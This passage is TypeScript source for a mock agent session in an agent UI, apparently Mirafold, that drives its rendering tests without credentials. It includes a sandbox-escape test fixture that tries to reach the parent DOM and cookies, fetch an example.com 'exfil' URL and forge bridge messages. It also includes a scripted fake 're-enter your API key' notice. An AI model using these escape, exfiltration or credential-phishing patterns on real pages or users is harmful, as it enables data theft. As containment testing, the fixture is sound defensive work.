import { randomUUID } from "node:crypto";
import type { AgentName, PromptOption, WireMsg } from "../protocol";
import {
  type AgentSession,
  type TodoItem,
  capOutput,
  emitPromptOptions,
  PERMISSION_TIMEOUT_MS,
} from "./types";
import { RENDER_TOOL_COMPONENT } from "./render-mcp-cmd";
import { codexSlashOptions } from "./codex-prompt-options";

// component → its real render_* tool name, inverted from the one mapping
// (2026-07-28 fix: a hand-rolled inverse here produced tool names no agent
// can call — "render_key-value" for the real render_keyvalue).
const RENDER_TOOL_BY_COMPONENT = new Map<string, string>(
  Object.entries(RENDER_TOOL_COMPONENT).map(([tool, component]) => [component, tool]),
);

// ---------------------------------------------------------------------------
// Mock content — five demo "personas", drawn from a shuffled deck with
// randomized details so an API-free demo feels varied. Agent-neutral: the
// mock is a dev stand-in for any adapter that lacks credentials, not a fake
// of any particular agent.
// ---------------------------------------------------------------------------

const pick = <T,>(arr: readonly T[]): T => arr[Math.floor(Math.random() * arr.length)];
const randInt = (lo: number, hi: number) => lo + Math.floor(Math.random() * (hi - lo + 1));
const spark = (n = 14) =>
  Array.from({ length: n }, () => "▁▂▃▄▅▆▇█"[randInt(0, 7)]).join("");
const shuffled = <T,>(arr: readonly T[]): T[] =>
  [...arr].sort(() => Math.random() - 0.5);

const PROJECTS = ["aurora", "helios", "quasar", "meridian", "lattice", "voyager"] as const;
const SERVICES = ["api-gateway", "auth", "billing", "search", "ingest", "renderer", "scheduler"] as const;
const FILES = ["server/session.ts", "web/src/RenderZone.tsx", "lib/cache.ts", "worker/queue.ts"] as const;
const TOPICS = [
  "local-first sync engines",
  "WebGPU compute pipelines",
  "prompt-caching economics",
  "CRDT merge strategies",
] as const;
// Mock tool calls (Phase T.1): each yields a full use→result pair so the
// transcript's tool blocks are exercised API-free; the last one is an error.
const MOCK_TOOLS: (() => {
  name: string;
  detail: string;
  output: string;
  isError?: boolean;
  input?: Record<string, unknown>;
})[] = [
  // ONE draw shared by the row's detail and its input — two independent picks
  // could name different files in the collapsed row vs the expanded diff
  // (2026-07-28 fix).
  () => {
    const file = pick(FILES);
    return {
      name: "Edit",
      detail: file,
      input: {
        file_path: file,
        old_string:
          "export function retry(fn, times) {\n  for (let i = 0; i < times; i++) {\n    return fn();\n  }\n}",
        new_string:
          "export async function retry(fn, times) {\n  let lastErr;\n  for (let i = 0; i < times; i++) {\n    try {\n      return await fn();\n    } catch (err) {\n      lastErr = err;\n    }\n  }\n  throw lastErr;\n}",
      },
      output: `Updated 1 occurrence`,
    };
  },
  () => {
    const file = pick(FILES);
    return {
      name: "Write",
      detail: file,
      input: {
        file_path: file,
        content: `import { retry } from "./retry";\n\nexport const fetchStats = () =>\n  retry(() => fetch("/api/stats").then((r) => r.json()), 3);\n`,
      },
      output: "File created",
    };
  },
  () => ({
    name: "Bash",
    detail: "ls -la src/",
    output: [
      `total ${randInt(24, 96)}`,
      ...shuffled(FILES)
        .slice(0, 3)
        .map(
          (f) =>
            `-rw-r--r--  1 dev dev  ${randInt(1, 9)}${randInt(100, 999)} Jul  4 1${randInt(0, 9)}:${randInt(10, 59)} ${f.split("/").pop()}`,
        ),
    ].join("\n"),
  }),
  () => ({
    name: "Grep",
    detail: `-rn "TODO" ${pick(FILES).split("/")[0]}/`,
    output: shuffled(FILES)
      .slice(0, 3)
      .map((f) => `${f}:${randInt(10, 240)}: // TODO: ${sentence().toLowerCase()}`)
      .join("\n"),
  }),
  () => ({
    name: "Read",
    detail: pick(FILES),
    output: Array.from({ length: 5 }, (_, i) => `${i + 1}→${pick(SENTENCES)}`).join("\n"),
  }),
  () => ({
    name: "Bash",
    detail: "yarn test --run",
    output: `$ vitest run
✗ ${pick(SERVICES)} › invalidates the cache on write
  AssertionError: expected 2 to be 1
    at ${pick(FILES)}:${randInt(20, 200)}:${randInt(2, 40)}
Tests: 1 failed, ${randInt(8, 30)} passed`,
    isError: true,
  }),
];
const SENTENCES = [
  "The hot path allocates on every call, which dominates the flame graph.",
  "Cache locality, not algorithmic complexity, explains most of the variance.",
  "Retry storms amplify tail latency far more than raw throughput suggests.",
  "The write path fans out to three consumers, only one of which is critical.",
  "Batching at the boundary removes 80% of the round trips for free.",
  "Most of the cost is serialization, not the network itself.",
  "The failure mode is silent degradation rather than a clean crash.",
  "Backpressure is absorbed at the queue, so upstream never notices.",
] as const;
const sentence = () => pick(SENTENCES);

const welcomeTemplate = (prompt: string) => `## Demo session

You said: **${prompt}**

This agent has no credentials, so a scripted demo reply is exercising the
rendering pipeline — nothing here came from a real agent.

- Streaming text deltas ✓
- Markdown with [a safe link](https://example.com) ✓
- Fenced code:

\`\`\`ts
export type WireMsg = { type: "text_delta"; text: string };
\`\`\`

| feature | status |
| --- | --- |
| tables | render |
| links | open in new tab |

To go live, connect your agent's credentials (see the demo banner above) and
restart Mirafold.`;

const analyticsTemplate = () => {
  const project = pick(PROJECTS);
  const rows = shuffled(SERVICES)
    .slice(0, randInt(4, 5))
    .map(
      (svc) =>
        `| \`${svc}\` | ${randInt(8, 40)}ms | ${randInt(60, 240)}ms | 0.0${randInt(1, 9)}% | ${pick(["▲", "▼"])} ${randInt(1, 12)}% |`,
    )
    .join("\n");
  return `## ⚡ Weekly performance — \`${project}\`

**Uptime:** 99.9${randInt(0, 9)}% · **Deploys:** ${randInt(3, 24)} · **MTTR:** ${randInt(4, 40)}m

| service | p50 | p99 | error rate | trend |
| --- | --- | --- | --- | --- |
${rows}

\`\`\`
requests  ${spark()}
errors    ${spark()}
latency   ${spark()}
\`\`\`

> 🔎 **Insight:** ${sentence()}

**Recommended next steps**

1. ${sentence()}
2. ${sentence()}
3. Re-run the load test and compare against [last week's baseline](https://example.com/baseline).`;
};

const codeReviewTemplate = () => {
  const file = pick(FILES);
  return `## Code review: \`${file}\`

Found **${randInt(2, 5)} issues** across ${randInt(1, 4)} files. ${sentence()}

### 🔴 Blocking — race in cache invalidation

\`\`\`diff
- const cached = this.cache.get(key);
- if (cached) return cached;
+ const cached = await this.cache.getOrLock(key);
+ if (cached !== undefined) return cached;
\`\`\`

### 🟡 Suggestion — hoist the invariant

\`\`\`ts
const root = path.resolve(workspaceDir); // compute once, not per call
export const isInside = (p: string) => p.startsWith(root + path.sep);
\`\`\`

> ${sentence()}

**Fix checklist**

- [x] Reproduce under load
- [ ] Patch the lock acquisition
- [ ] Add a regression test
- [ ] Backport to \`release/${randInt(1, 3)}.${randInt(0, 9)}\``;
};

const planTemplate = () => {
  const project = pick(PROJECTS);
  return `## Migration plan: \`${project}\` → workers

> **Goal:** ${sentence()}

### Phase 1 — extract the seam
- [x] Freeze the public interface
- [x] Add contract tests
- [ ] Route ${randInt(5, 25)}% of traffic through the shim

### Phase 2 — cut over
- [ ] Dual-write for ${randInt(2, 7)} days
- [ ] Compare checksums, then flip the read path

| risk | owner | mitigation |
| --- | --- | --- |
| replay divergence | @core | checksum audit job |
| queue backlog | @infra | autoscale at ${randInt(60, 85)}% |
| stale cache | @web | TTL drop to ${randInt(1, 10)}m |

**ETA:** ${randInt(2, 6)} weeks. ${sentence()}`;
};

const researchTemplate = () => {
  const topic = pick(TOPICS);
  return `## Research brief: ${topic}

**TL;DR:** ${sentence()}

### Findings

1. **Adoption is uneven.** ${sentence()}
2. **The bottleneck moved.** ${sentence()}
3. **Tooling is the moat.** ${sentence()}

> "${sentence()}" — [primary source](https://example.com/paper)

| source | type | relevance |
| --- | --- | --- |
| [Systems survey](https://example.com/survey) | paper | high |
| [Field notes](https://example.com/notes) | blog | medium |
| [Benchmark repo](https://example.com/bench) | code | high |

*Confidence: ${pick(["low", "medium", "high"])} — based on ${randInt(4, 12)} sources.*`;
};

const TEMPLATES: ((prompt: string) => string)[] = [
  welcomeTemplate,
  analyticsTemplate,
  codeReviewTemplate,
  planTemplate,
  researchTemplate,
];

// Sample `render` payloads (mock-first: the render flow works API-free).
// Props must satisfy the registry spec — validated by the 1.2 smoke test.
export const MOCK_RENDERS: (() => { component: string; props: Record<string, unknown> })[] = [
  () => ({
    component: "card",
    props: {
      title: `Deploy verdict: ${pick(PROJECTS)}`,
      body: `**Ship it.** ${sentence()}`,
      footer: `mock render · ${new Date().toLocaleTimeString()}`,
    },
  }),
  () => ({
    component: "list",
    props: {
      title: "Follow-ups",
      ordered: true,
      items: [
        { text: sentence() },
        { text: sentence(), detail: `owner: @${pick(SERVICES)}` },
        { text: sentence() },
      ],
    },
  }),
  () => ({
    component: "table",
    props: {
      title: `Hot paths — \`${pick(PROJECTS)}\``,
      columns: ["service", "p99 (ms)", "calls/min"],
      rows: shuffled(SERVICES)
        .slice(0, 3)
        .map((svc) => [`\`${svc}\``, randInt(60, 240), randInt(200, 9000)]),
    },
  }),
  () => ({
    component: "chart",
    props: {
      title: `p99 latency — ${pick(PROJECTS)}`,
      kind: pick(["line", "bar"] as const),
      x: ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"],
      yLabel: "ms",
      series: shuffled(SERVICES)
        .slice(0, randInt(1, 3))
        .map((svc) => ({
          name: svc,
          values: Array.from({ length: 7 }, () => randInt(40, 240)),
        })),
    },
  }),
  () => ({
    component: "link-group",
    props: {
      title: "Sources",
      links: [
        { label: "Systems survey", href: "https://example.com/survey", description: "paper" },
        { label: "Benchmark repo", href: "https://example.com/bench" },
      ],
    },
  }),
  () => ({
    component: "card",
    props: {
      title: `Regression in ${pick(SERVICES)}`,
      body: `**2 tests failing** since the last deploy. ${sentence()}`,
      kind: pick(["info", "success", "warning", "error"] as const),
      footer: "mock callout card",
    },
  }),
  () => ({
    component: "key-value",
    props: {
      title: `Environment — ${pick(PROJECTS)}`,
      pairs: [
        { key: "node", value: "`v22.11.0`" },
        { key: "package manager", value: "yarn 4" },
        { key: "typecheck", value: pick(["**clean**", "2 errors"]) },
        { key: "coverage", value: `${randInt(62, 97)}%` },
      ],
    },
  }),
  () => ({
    component: "progress",
    props: {
      label: `Running test suite — ${pick(PROJECTS)}`,
      percent: randInt(5, 95),
      detail: `tier 1 · \`${pick(SERVICES)}\``,
    },
  }),
  () => ({
    component: "timeline",
    props: {
      title: "Rollout",
      items: [
        { label: "Canary deployed", time: "09:12" },
        { label: `\`${pick(SERVICES)}\` at 50%`, time: "09:40", detail: sentence() },
        { label: "Full fleet", time: "10:05" },
      ],
    },
  }),
  () => ({
    component: "diff",
    props: {
      title: `Proposed fix — ${pick(SERVICES)}`,
      files: [
        {
          path: "src/cache/store.ts",
          before: "const cached = this.cache.get(key);\nif (cached) return cached;",
          after:
            "const cached = await this.cache.getOrLock(key);\nif (cached !== undefined) return cached;",
        },
        {
          path: "src/cache/store.test.ts",
          before: "",
          after: "it('locks concurrent gets', async () => {\n  await hammer(store);\n});",
          note: "new file",
        },
      ],
    },
  }),
  () => ({
    component: "stat",
    props: {
      label: pick(["Cache hit rate", "p95 latency", "Bundle size"]),
      value: pick(["87.4%", "212 ms", "1.2 MB"]),
      delta: {
        value: pick(["+2.1%", "-14 ms", "+38 kB"]),
        direction: pick(["up", "down"] as const),
        good: pick([true, false]),
      },
      footer: `mock stat · ${pick(PROJECTS)}`,
    },
  }),
  () => ({
    component: "code",
    props: {
      code: `export function retry(n: number) {\n  return Math.min(2 ** n * 100, 5_000);\n}`,
      lang: "ts",
      filename: `src/lib/${pick(SERVICES)}.ts`,
      highlight: [{ start: 2 }],
    },
  }),
  () => ({
    component: "status-list",
    props: {
      title: `Checks — ${pick(PROJECTS)}`,
      items: [
        { label: "typecheck", status: "pass" },
        { label: "unit suite", status: pick(["pass", "fail", "pending"] as const) },
        { label: "lint", status: pick(["pass", "warn", "skip"] as const), detail: sentence() },
      ],
    },
  }),
  () => ({
    component: "file-tree",
    props: {
      title: `Touched files — ${pick(PROJECTS)}`,
      paths: [
        { path: "src/api/router.ts", note: "modified" },
        { path: "src/api/handlers/auth.ts", note: "new" },
        { path: "src/lib/tokens.ts" },
        { path: "test/fixtures/" },
        { path: "test/auth.test.ts", note: "new" },
      ],
    },
  }),
];

// The hostile-artifact fixture. Each escape attempt writes its outcome
// into the artifact's own DOM (the one place it CAN write), so a browser test
// reads containment results through the frame. It also fires the bridge
// abuses whose proof is a NON-event in the transcript: forged/unstamped
// postMessages and an action burst against the rate limit (R.4e).
const HOSTILE_ARTIFACT =
  "<h2>hostile artifact</h2>" +
  '<div id="dom">pending</div>' +
  '<div id="cookie">pending</div>' +
  '<div id="csp">pending</div>' +
  '<div id="sent">pending</div>' +
  "<script>" +
  "var set=function(id,v){document.getElementById(id).textContent=v};" +
  // Escape 1: the shell's DOM — must be structurally unreachable.
  "try{void parent.document;set('dom','PARENT-DOM-REACHED')}catch(e){set('dom','parent-dom-blocked')}" +
  // Escape 2: app-origin storage — opaque origin must throw.
  "try{void document.cookie;set('cookie','COOKIE-REACHED')}catch(e){set('cookie','cookie-blocked')}" +
  // Escape 3: network exfiltration — the injected CSP must block fetch.
  "document.addEventListener('securitypolicyviolation',function(e){set('csp','csp-violation:'+(e.effectiveDirective||e.violatedDirective))});" +
  "try{fetch('https://example.com/exfil').then(function(){set('csp','FETCH-SUCCEEDED')},function(){})}catch(e){}" +
  // Escape 4: forged bridge messages — unstamped and wrong-nonce state op.
  "try{parent.postMessage({mirafold:1,action:{kind:'prompt',text:'forged-unstamped-prompt'}},'*')}catch(e){}" +
  "try{parent.postMessage({mirafold:1,nonce:'guessed',action:{kind:'state',op:'set',key:'x',value:'y'}},'*')}catch(e){}" +
  // Escape 5: an action burst — the 400ms rate limit must drop the second.
  "mirafold.prompt('burst-alpha');mirafold.prompt('burst-beta');" +
  "set('sent','attacks-sent');" +
  "</script>";

/**
 * Stand-in session for API-free development: emits a scripted WireMsg
 * stream that covers every Phase 0 message type. Replies are drawn from
 * a shuffled deck of five templates so no template repeats until all
 * five have been seen.
 */
export class MockSession implements AgentSession {
  private listeners = new Set<(msg: WireMsg) => void>();
  private timers: ReturnType<typeof setTimeout>[] = [];
  private deck: number[] = [];
  // Turns opened but not yet closed — interrupt() must close every one.
  private openTurns = 0;
  private pendingAsks = new Map<string, (allow: boolean) => void>();

  constructor(private agent: AgentName = "claude-code") {}

  get modelName(): string {
    return "mock-sonnet";
  }

  refreshPromptOptions() {
    const genericSlash: PromptOption[] = [
      { trigger: "/", value: "/model", label: "model", description: "choose a model", kind: "command" },
      { trigger: "/", value: "/help", label: "help", description: "show available commands", kind: "command" },
      { trigger: "/", value: "/skills", label: "skills", description: "show available skills", kind: "command" },
    ];
    const slash = this.agent === "codex" ? codexSlashOptions() : genericSlash;
    const options =
      this.agent === "codex"
        ? [
            ...slash,
            { trigger: "$" as const, value: "$audit", label: "audit", description: "run a security audit", kind: "skill" as const },
            { trigger: "$" as const, value: "$next", label: "next", description: "execute the next plan chunk", kind: "skill" as const },
          ]
        : slash;
    emitPromptOptions((msg) => this.emit(msg), options);
  }

  // Each deterministic hook exercises one UI capability API-free; anything
  // else is a canned reply drawn from the template deck.
  pushPrompt(text: string) {
    if (/interactive|button/i.test(text)) return this.playActionCard();
    if (/todo|checklist|step by step|plan it/i.test(text)) return this.playChecklist();
    if (/subagent|delegate/i.test(text)) return this.playSubagent();
    if (/huge|big output|large output|truncat/i.test(text)) return this.playHugeOutput();
    if (/artifact/i.test(text)) {
      // broken/navigating artifacts exercise the failure fallbacks (3.4).
      if (/broken|crash/i.test(text)) {
        return this.playArtifact(
          "broken demo",
          '<h2>about to crash</h2><script>throw new Error("deliberate mock crash")</script>',
        );
      }
      if (/navigat|escape/i.test(text)) {
        // about:blank triggers the same liveness kill as any external URL,
        // hermetically — the e2e containment test must not need the network.
        return this.playArtifact(
          "navigating demo",
          '<h2>leaving…</h2><script>location.href="about:blank"</script>',
        );
      }
      // An artifact that ATTEMPTS the escapes, reporting each result
      // into its own DOM so the e2e can assert containment from outside (R.4e).
      if (/hostile/i.test(text)) return this.playArtifact("hostile demo", HOSTILE_ARTIFACT);
      // Same id re-sent with new html — the update-in-place mechanism the
      // per-artifact UUIDs above never exercise (2026-07-29 bughunt).
      if (/updat/i.test(text)) return this.playUpdatingArtifact();
      return this.playBridgeArtifact();
    }
    if (/fail the turn|turn error/i.test(text)) return this.playTurnError();
    if (/dangerous|sudo|rm -rf/i.test(text)) return this.playPermissionAsk();
    if (/notice|attribution/i.test(text)) return this.playNotices();
    if (/question|choose|decide/i.test(text)) return this.playQuestion();
    if (/picker/i.test(text)) return this.playPicker();
    if (/chart demo/i.test(text)) return this.playCharts();
    if (/console/i.test(text)) return this.playConsole();
    if (/tool activity|transcript compact/i.test(text)) return this.playToolActivity();
    if (/screenshot/i.test(text)) return this.playImage();
    if (/diagram/i.test(text)) return this.playDiagram();
    if (/kpi/i.test(text)) return this.playStat();
    if (/snippet/i.test(text)) return this.playCode();
    if (/health/i.test(text)) return this.playStatusList();
    this.playTemplateTurn(text);
  }

  onMessage(cb: (msg: WireMsg) => void) {
    this.listeners.add(cb);
  }

  interrupt() {
    // ONE turn_end per OPEN turn (2026-07-30). This scenario engine schedules
    // a whole turn as timers, and abandonTurn() clears the timer table — so
    // with a queued turn also in flight, both turns' scheduled `turn_end`s
    // died while a single one was emitted here. The daemon's mid-turn burst
    // gate deliberately admits one queued prompt, so two open turns is the
    // NORMAL case for a user who types again and then hits stop; the orphaned
    // turn left the shell's counter above zero and its activity indicator
    // stuck on "working…" for the life of the session, healing on neither a
    // later turn nor a reload (replay rebuilds the imbalance). It cost a long
    // Tier-3 flake hunt; the real adapters don't share the shape, because
    // each of their turns completes on its own path.
    //
    // Floor of one: interrupting an idle session still answers, matching the
    // claude-code adapter's "extra turn_end after the abort settles" — the
    // client's counter floors at zero, so an extra is a no-op.
    const open = Math.max(1, this.openTurns);
    this.abandonTurn();
    this.openTurns = 0;
    for (let i = 0; i < open; i++) this.emit({ type: "turn_end" });
  }

  resolvePermission(id: string, allow: boolean) {
    this.pendingAsks.get(id)?.(allow);
  }

  close() {
    this.abandonTurn();
  }

  /** A turn that dies the way a real engine dies: `error` and NO `turn_end`
   *  (2026-07-30). Every real adapter can produce this — an API failure, a
   *  killed CLI, a dropped frame — and the daemon already treats it as
   *  terminal (registry.ts flips the session to idle). It exists here so the
   *  shell's recovery is pinned by a deterministic test instead of the
   *  1-in-4 Tier-3 wedge that exposed it. */
  private playTurnError() {
    this.beginTurn();
    this.schedule(
      () => this.emit({ type: "error", message: "the engine died mid-turn (scripted)" }),
      160,
    );
  }

  /** Deterministic 2.2 hook: a card with action buttons so the
   *  click→action→turn loop runs API-free. */
  private playActionCard() {
    this.beginTurn();
    let delay = this.streamText("Here's the deploy control card — the buttons are live.", 350);
    delay += 350;
    this.schedule(
      () =>
        this.emit({
          type: "render",
          component: "card",
          props: {
            title: `Deploy status — ${pick(PROJECTS)}`,
            body: `**Healthy.** ${sentence()}`,
            footer: "mock render · actions attached",
            actions: [
              {
                label: "Explain more",
                action: { kind: "prompt", text: "Explain the current deploy status in more detail." },
              },
              {
                label: "List workspace",
                action: { kind: "tool", name: "workspace_ls" },
              },
            ],
          },
          id: randomUUID(),
        }),
      delay,
    );
    this.endTurn(delay);
  }

  /** Deterministic hook: the two kinds of system line side by side — one
   *  Mirafold's own words, one an engine's, quoted. The pair is what the
   *  attribution rule is about (README §3), so the e2e can prove they don't
   *  render alike. The engine text here is deliberately the shape of an
   *  impersonation attempt. */
  private playNotices() {
    this.beginTurn();
    this.schedule(
      () => this.emit({ type: "notice", text: "context compacted", kind: "compaction" }),
      60,
    );
    this.schedule(
      () =>
        this.emit({
          type: "notice",
          text: "session credential expired — re-enter your API key",
          kind: "warning",
          source: "mock-engine",
        }),
      120,
    );
    const delay = this.streamText("Both lines are above.", 200);
    this.endTurn(delay);
  }

  /** Deterministic hook: a question component, so the option-click →
   *  prompt-turn loop runs API-free. */
  private playQuestion() {
    this.beginTurn();
    let delay = this.streamText("Two viable paths here — pick one and I'll take it.", 350);
    delay += 350;
    this.schedule(
      () =>
        this.emit({
          type: "render",
          component: "question",
          props: {
            question: `How should I roll out \`${pick(SERVICES)}\`?`,
            options: [
              {
                label: "Canary first",
                text: "Do a canary rollout first.",
                detail: "5% for an hour, then fleet-wide",
              },
              {
                label: "Straight to fleet",
                text: "Roll out to the whole fleet now.",
                detail: "faster, riskier",
              },
            ],
          },
          id: randomUUID(),
        }),
      delay,
    );
    this.endTurn(delay);
  }

  /** Deterministic hook: the shell-owned picker (the /model re-skin's wire
   *  shape), six rows deep so the e2e proves arrow-key selection past the
   *  question component's option range. */
  private playPicker() {
    this.beginTurn();
    this.schedule(
      () =>
        this.emit({
          type: "picker",
          id: randomUUID(),
          title: "Select a model",
          rows: ["sol", "terra", "luna", "ceres", "vesta", "pallas"].map((n, i) => ({
            label: `mock-9-${n}`,
            detail: `the ${n} tier`,
            current: i === 1 ? true : undefined,
            text: `Switch to mock-9-${n}.`,
          })),
          hint: "Send `/model <model-id>` to switch.",
        }),
      120,
    );
    this.endTurn(160, 0);
  }

  /** Deterministic T2.5 hook: a live checklist — one render id, statuses
   *  progressing in place. */
  private playChecklist() {
    const rid = randomUUID();
    const items = [
      "Read the current implementation",
      "Draft the migration",
      "Update the tests",
      "Verify end to end",
    ];
    // active = index of the in_progress item; items before it are done.
    // active === items.length means every item is completed.
    const frame = (active: number): TodoItem[] =>
      items.map((content, i) => ({
        content,
        status: i < active ? "completed" : i === active ? "in_progress" : "pending",
      }));
    this.beginTurn();
    let d = 300;
    for (let active = 0; active <= items.length; active++) {
      this.paintRender(d, "todo-list", { todos: frame(active) }, rid);
      d += 550;
    }
    d = this.streamText("Plan complete — all four steps done.", d + 100);
    this.endTurn(d);
  }

  /** Deterministic S.1/S.2 hook: the chart stretch shapes in one turn — a
   *  pie that folds past 6 slices, a stacked bar, a horizontal bar with
   *  labels the vertical axis would truncate, and a MALFORMED pie (two
   *  series) whose designed degradation is the raw-props fallback. */
  private playCharts() {
    const paint = (props: Record<string, unknown>, at: number) =>
      this.paintRender(at, "chart", props);
    this.beginTurn();
    paint(
      {
        title: "Language mix",
        kind: "pie",
        x: ["TypeScript", "CSS", "HTML", "Shell", "JSON", "Markdown", "YAML", "SVG"],
        series: [{ name: "lines", values: [61_200, 9_800, 4_100, 2_600, 1_900, 1_400, 600, 300] }],
      },
      250,
    );
    paint(
      {
        title: "Tokens by model",
        kind: "bar",
        stacked: true,
        x: ["Mon", "Tue", "Wed", "Thu"],
        yLabel: "tokens",
        series: [
          { name: "sonnet", values: [42_000, 51_000, 38_000, 47_000] },
          { name: "haiku", values: [18_000, 12_000, 22_000, 16_000] },
          { name: "opus", values: [6_000, 9_000, 4_000, 8_000] },
        ],
      },
      600,
    );
    paint(
      {
        title: "Slowest e2e tests",
        kind: "bar",
        horizontal: true,
        yLabel: "s",
        x: [
          "explorer drill-in (phone)",
          "relay pairing handshake",
          "artifact sandbox escapes",
          "codex model picker flow",
          "gemini approval prompts",
        ],
        series: [{ name: "duration", values: [14.2, 11.8, 9.4, 7.1, 5.6] }],
      },
      950,
    );
    // The rule-breaker: two series under kind pie. The client must show the
    // legible raw-props fallback (RenderBlock's designed degradation), never
    // guess a slice set or crash the zone.
    paint(
      {
        title: "broken pie",
        kind: "pie",
        x: ["a", "b"],
        series: [
          { name: "s1", values: [1, 2] },
          { name: "s2", values: [3, 4] },
        ],
      },
      1300,
    );
    const d = this.streamText("Three chart shapes and one deliberate rule-breaker.", 1450);
    this.endTurn(d);
  }

  /** Deterministic hook: a mermaid diagram (sandbox-rendered), plus one with
   *  broken source — the failure shows the source, never a blank frame. */
  private playDiagram() {
    this.beginTurn();
    this.paintRender(300, "diagram", {
      title: "Relay pairing flow",
      source: [
        "sequenceDiagram",
        "  participant P as Phone",
        "  participant R as Relay",
        "  participant D as Daemon",
        "  P->>R: dial (pairId)",
        "  R->>D: forward (opaque)",
        "  D-->>P: E2E handshake",
        "  P->>D: attach session",
      ].join("\n"),
    });
    this.paintRender(700, "diagram", {
      title: "broken diagram",
      source: "flowchart TD\n  A --> ] nope [",
    });
    const d = this.streamText("The pairing flow, drawn — and one deliberately broken source.", 900);
    this.endTurn(d);
  }

  /** Deterministic hook: the image component in both states — pixels
   *  arrived (a daemon-resolved data URI, mock-inlined here since the mock
   *  emits WireMsgs directly), and the daemon-refused unavailable box. */
  private playImage() {
    // A real 1×1 PNG so the client draws an actual <img>.
    const px =
      "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
    this.beginTurn();
    this.paintRender(300, "image", {
      path: "shots/welcome.png",
      alt: "the welcome screen after the fix",
      caption: "welcome screen, dark theme",
      src: px,
    });
    this.paintRender(650, "image", {
      path: "shots/huge.png",
      alt: "a screenshot that was too big",
      error: "too large (4.2 MB; the cap is 2 MB)",
    });
    const d = this.streamText("The welcome screen matches the mock — one shot was over the cap.", 800);
    this.endTurn(d);
  }

  /** Deterministic hook: quoted terminal output — ANSI colors, an OSC
   *  sequence that must strip, a failing exit badge. */
  private playConsole() {
    const out = [
      "\x1b]0;window title junk\x07> mirafold@0.2.0 test",
      "\x1b[1;32m✓\x1b[0m registry spec pins the vocabulary (12 ms)",
      "\x1b[1;31m✗ console renders ANSI colors\x1b[0m",
      "  \x1b[31mAssertionError\x1b[0m: expected \x1b[33m3\x1b[0m spans, got \x1b[33m2\x1b[0m",
      "      at \x1b[2mConsole.test.ts:41:9\x1b[0m",
      "",
      "\x1b[90m1 failing, 411 passing\x1b[0m",
    ].join("\n");
    this.beginTurn();
    this.paintRender(300, "console", { command: "yarn test", output: out, exitCode: 1 });
    const d = this.streamText("One assertion is off — the span-merge case.", 500);
    this.endTurn(d);
  }

  /** Deterministic S.3 hook: a KPI tile kept live — one render id, the
   *  number moving in place. */
  private playStat() {
    const rid = randomUUID();
    const frame = (value: string, delta: string) => ({
      label: "Coverage",
      value,
      delta: { value: delta, direction: "up" as const, good: true },
      footer: "yarn test · tier 1",
    });
    this.beginTurn();
    this.paintRender(250, "stat", frame("94.2%", "+1.1%"), rid);
    this.paintRender(900, "stat", frame("96.8%", "+3.7%"), rid);
    const d = this.streamText("Coverage is climbing as the new tests land.", 1000);
    this.endTurn(d);
  }

  /** Deterministic hook: a code block — header, tokenized body, emphasized
   *  lines (display code, NOT a change — that's the diff component). */
  private playCode() {
    const code = [
      'import { readFile } from "node:fs/promises";',
      "",
      "export async function loadConfig(path: string) {",
      '  const raw = await readFile(path, "utf8");',
      "  return JSON.parse(raw); // TODO: validate",
      "}",
    ].join("\n");
    this.beginTurn();
    const d = this.streamText(
      "Here's the loader as it stands — the parse is the part worth reading:",
      200,
    );
    this.paintRender(d + 250, "code", {
      code,
      lang: "ts",
      filename: "src/config/load.ts",
      highlight: [{ start: 4, end: 5 }],
    });
    this.endTurn(d, 300);
  }

  /** Deterministic hook: check rows with verdict pills — one row per status
   *  the vocabulary knows, so the e2e pins the whole enum's rendering. */
  private playStatusList() {
    this.beginTurn();
    this.paintRender(300, "status-list", {
      title: "Health checks",
      items: [
        { label: "unit suite", status: "pass", detail: "394 tests, 7.4s" },
        { label: "e2e suite", status: "pending" },
        { label: "lint", status: "warn", detail: "2 warnings in `server/pty`" },
        { label: "relay probe", status: "fail", detail: "dial refused (4007)" },
        { label: "live-model probe", status: "skip", detail: "no API key" },
      ],
    });
    const d = this.streamText("Four suites checked — the relay probe is the one to chase.", 500);
    this.endTurn(d);
  }

  /** Deterministic T2.4 hook: a Task whose inner tool calls nest under it
   *  (subagent text stays hidden). */
  private playSubagent() {
    const taskId = randomUUID();
    this.beginTurn();
    this.schedule(() => {
      this.emit({ type: "status", state: "tool", label: "Task" });
      this.emit({
        type: "tool_use",
        name: "Task",
        detail: "research: audit the config loader",
        id: taskId,
        input: { description: "audit config loader", subagent_type: "Explore" },
      });
    }, 350);
    // Subagent's inner calls — each tagged with the Task's id as parentId.
    const inner: { name: string; detail: string; output: string }[] = [
      { name: "Grep", detail: '-rn "loadConfig" src/', output: "src/config.ts:12: export function loadConfig(" },
      { name: "Read", detail: "src/config.ts", output: Array.from({ length: 4 }, (_, i) => `${i + 1}→${pick(SENTENCES)}`).join("\n") },
      { name: "Bash", detail: "node -e 'require(\"./config\")'", output: "config OK — 3 sources merged" },
    ];
    let d = 700;
    for (const t of inner) {
      const cid = randomUUID();
      d += randInt(250, 450);
      this.schedule(() => this.emit({ type: "tool_use", name: t.name, detail: t.detail, id: cid, parentId: taskId }), d);
      d += randInt(250, 450);
      this.schedule(() => this.emit({ type: "tool_result", output: t.output, id: cid, parentId: taskId }), d);
    }
    d += 300;
    this.schedule(
      () => this.emit({ type: "tool_result", output: "Audit complete: loader merges 3 sources; no precedence bug found.", id: taskId }),
      d,
    );
    d = this.streamText("The subagent audited the config loader — it merges three sources correctly, no precedence bug.", d + 200);
    this.endTurn(d);
  }

  /** Deterministic T2.3 hook: a tool whose output blows past the cap,
   *  exercising the elision marker. */
  private playHugeOutput() {
    const id = randomUUID();
    const bigLine = "2026-07-05T12:00:00Z  INFO  request served in 42ms — ok\n";
    const big = bigLine.repeat(2000); // ~110KB, well over the 64KB cap
    const capped = capOutput(big);
    this.beginTurn();
    this.schedule(() => {
      this.emit({ type: "status", state: "tool", label: "Bash" });
      this.emit({ type: "tool_use", name: "Bash", detail: "cat server.log", id });
    }, 400);
    this.schedule(
      () =>
        this.emit({
          type: "tool_result",
          output: capped.text,
          truncatedBytes: capped.truncatedBytes,
          id,
        }),
      900,
    );
    const d = this.streamText("That log is enormous — showing the head, the rest is elided.", 1100);
    this.endTurn(d);
  }

  /** Deterministic 3.2/3.3 hook: a small interactive artifact with bridge
   *  buttons (one allowlisted tool, one off-allowlist, one prompt) so
   *  sandbox + bridge run API-free. */
  private playBridgeArtifact() {
    this.beginTurn();
